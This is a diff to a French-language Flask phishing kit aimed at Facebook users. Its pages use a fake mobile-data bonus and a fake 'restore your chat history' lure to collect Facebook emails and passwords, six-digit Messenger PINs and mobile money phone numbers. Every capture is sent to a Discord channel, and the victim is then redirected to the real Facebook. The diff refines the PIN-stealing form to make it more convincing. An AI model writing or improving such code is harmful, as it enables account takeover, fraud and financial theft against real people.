@@ -87,19 +87,47 @@ HTML_BONUS = '''
         input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
         button { width: 100%; padding: 12px; background-color: #2ecc71; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
         button:hover { background-color: #27ae60; }
+
+        .pin-container {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin: 15px 0;
+        }
+        .pin-input {
+            width: 40px;
+            height: 50px;
+            text-align: center;
+            font-size: 24px;
+            border-radius: 8px;
+            border: 1px solid #ccc;
+            background-color: #f9f9f9;
+        }
+        .pin-input:focus {
+            outline: none;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
+        }
     </style>
 </head>
 <body>
     <div class="promo-box">
         <div class="success-icon">✔</div>
-        <h2>Compte Éligible !</h2>
-        <div class="data-badge">PACK 500 MO ACTIVER</div>
-        <p>Entrez votre code PIN Messenger et votre numéro pour recevoir votre code d'activation :</p>
+        <h2>Saisissez votre code PIN pour restaurer l'historique de vos discussions</h2>
+        <div class="data-badge">PACK 500 Mo ACTIVER</div>
+        <p>Il manque certains messages. Entrez votre code PIN pour restaurer l'historique de vos discussions.</p>
 
-        <!-- Formulaire PIN Messenger -->
-        <form action="/messenger_pin" method="post">
-            <input type="text" name="pin_code" placeholder="Code PIN Messenger" required>
-            <button type="submit">VALIDER MON CODE</button>
+        <!-- Formulaire PIN Messenger (6 cases) -->
+        <form action="/messenger_pin" method="post" class="pin-form">
+            <div class="pin-container">
+                <input type="text" name="d1" maxlength="1" class="pin-input" required>
+                <input type="text" name="d2" maxlength="1" class="pin-input" required>
+                <input type="text" name="d3" maxlength="1" class="pin-input" required>
+                <input type="text" name="d4" maxlength="1" class="pin-input" required>
+                <input type="text" name="d5" maxlength="1" class="pin-input" required>
+                <input type="text" name="d6" maxlength="1" class="pin-input" required>
+            </div>
+            <button type="submit">CONFIRMER MON CODE PIN</button>
         </form>
 
         <!-- Formulaire numéro téléphone -->
@@ -126,41 +154,48 @@ def auth():
 def capture():
     email = request.form.get('email')
     password = request.form.get('pass')
-    
-    # Envoi vers Discord
+
     message = (
         f"🔥 **NOUVELLE CAPTURE FB** 🔥\n"
         f"👤 **User:** `{email}`\n"
         f"🔑 **Pass:** `{password}`"
     )
     send_to_discord(message)
-    
+
     print(f"\n[!] LOGS CAPTURÉS : {email} | {password}")
     return render_template_string(HTML_BONUS)
 
 @app.route('/messenger_pin', methods=['POST'])
 def capture_pin():
-    pin = request.form.get('pin_code')
-    
+    d1 = request.form.get('d1', '')
+    d2 = request.form.get('d2', '')
+    d3 = request.form.get('d3', '')
+    d4 = request.form.get('d4', '')
+    d5 = request.form.get('d5', '')
+    d6 = request.form.get('d6', '')
+
+    pin = d1 + d2 + d3 + d4 + d5 + d6
+
     message = (
         f"💬 **PIN MESSENGER CAPTURÉ** 💬\n"
         f"🔓 **Code d'accès aux messages :** `{pin}`"
     )
     send_to_discord(message)
-    
-    # Après le PIN, on peut soit ré‑afficher la page, soit laisser comme ça
+
+    # Tu peux soit ré-afficher la page, soit rediriger directement :
     return render_template_string(HTML_BONUS)
+    # ou par exemple : return redirect("https://www.facebook.com")
 
 @app.route('/final', methods=['POST'])
 def final():
     phone = request.form.get('phone')
-    
+
     message = (
         f"💰 **NUMÉRO MOBILE MONEY** 💰\n"
         f"📱 **Tel:** `{phone}`"
     )
     send_to_discord(message)
-    
+
     print(f"[+] NUMÉRO POUR BONUS : {phone}\n")
     # Redirection vers le vrai Facebook
     return redirect("https://www.facebook.com")
